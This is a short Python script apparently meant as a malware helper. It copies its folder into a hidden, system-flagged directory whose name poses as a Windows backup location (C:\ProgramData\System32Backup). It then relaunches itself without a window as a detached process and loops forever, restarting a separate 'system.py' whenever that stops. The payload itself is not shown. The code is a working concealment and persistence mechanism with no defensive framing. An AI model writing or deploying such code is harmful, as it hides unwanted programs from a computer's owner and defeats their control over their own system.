import os
import sys
import time
import subprocess
import psutil
import shutil

HIDDEN_DIR = "C:\\ProgramData\\System32Backup"

def is_running(process_name):
    """Check if a process is already running."""
    for proc in psutil.process_iter(attrs=['cmdline']):
        try:
            if proc.info['cmdline'] and process_name in " ".join(proc.info['cmdline']):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return False

def move_to_hidden_directory():
    """Move to hidden directory and restart from there if needed."""
    if not os.path.abspath(__file__).startswith(HIDDEN_DIR):
        print("[INFO] Moving system32.py to hidden directory...")
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        
        script_dir = os.path.dirname(os.path.abspath(__file__))
        for filename in os.listdir(script_dir):
            source_path = os.path.join(script_dir, filename)
            dest_path = os.path.join(HIDDEN_DIR, filename)
            if os.path.isfile(source_path):
                shutil.copy2(source_path, dest_path)

        subprocess.run(["attrib", "+H", "+S", HIDDEN_DIR], shell=True)

        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        hidden_script_path = os.path.join(HIDDEN_DIR, os.path.basename(__file__))

        print("[INFO] Restarting system32.py from hidden directory...")
        subprocess.Popen([pythonw_path, hidden_script_path], creationflags=subprocess.DETACHED_PROCESS)
        sys.exit()

def restart_if_needed():
    """Ensure `system.py` is always running."""
    script_name = "system.py"
    script_path = os.path.join(HIDDEN_DIR, script_name)

    while True:
        time.sleep(5)

        if not is_running(script_name):
            print(f"[!] {script_name} is not running. Restarting...")
            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
            subprocess.Popen([pythonw_path, script_path], creationflags=subprocess.DETACHED_PROCESS)


move_to_hidden_directory()
restart_if_needed()
